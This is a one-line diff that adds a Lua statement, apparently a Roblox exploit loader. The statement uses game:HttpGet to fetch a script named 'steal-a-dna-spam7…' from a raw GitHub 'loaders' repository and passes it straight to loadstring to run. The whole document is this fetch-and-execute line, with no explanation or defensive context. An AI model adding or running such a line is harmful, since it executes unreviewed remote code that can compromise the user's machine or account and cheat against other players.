@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/steal-a-dna-spam7-5po9qa1eocjuwd.lua"))()
